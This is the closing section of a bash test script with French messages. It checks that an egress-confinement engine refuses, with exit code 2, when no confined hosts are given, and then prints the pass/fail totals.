out=$(python3 -B "$ENGINE" --confined-hosts "$D" "$(manifest_of "$D")" 2>&1) || rc=$?
assert_true "N14d zéro entrée confinée: exit 2, jamais 0" \
    "$([ "$rc" -eq 2 ] && echo 1 || echo 0)" \
    "exit $rc, sortie: $out"
assert_true "N14d le refus nomme le consommateur" \
    "$(grep -q 'verify-egress-uniqueness' <<< "$out" && echo 1 || echo 0)" \
    "sortie: $out"

# ============================================================================
echo ""
echo "===================================================="
echo "Résultats : $PASS réussies, $FAIL échouées"
echo "===================================================="

[ "$FAIL" -eq 0 ] || exit 1
exit 0
